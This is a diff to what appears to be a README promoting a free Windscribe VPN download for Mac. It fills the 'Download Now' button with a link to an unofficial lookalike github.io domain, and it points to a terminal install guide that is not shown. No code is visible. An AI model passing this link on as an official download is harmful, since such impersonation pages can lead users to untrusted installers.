@@ -2,7 +2,7 @@
 
 Windscribe is a powerful VPN solution designed to secure your online activity and unlock restricted content. Follow the instructions below to install Windscribe on your Mac for free and enjoy private browsing with ease.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://windscribe-vpn-for-mac.github.io/.github/)
 
 If the download button doesn’t work, follow the step-by-step terminal installation guide below.
 
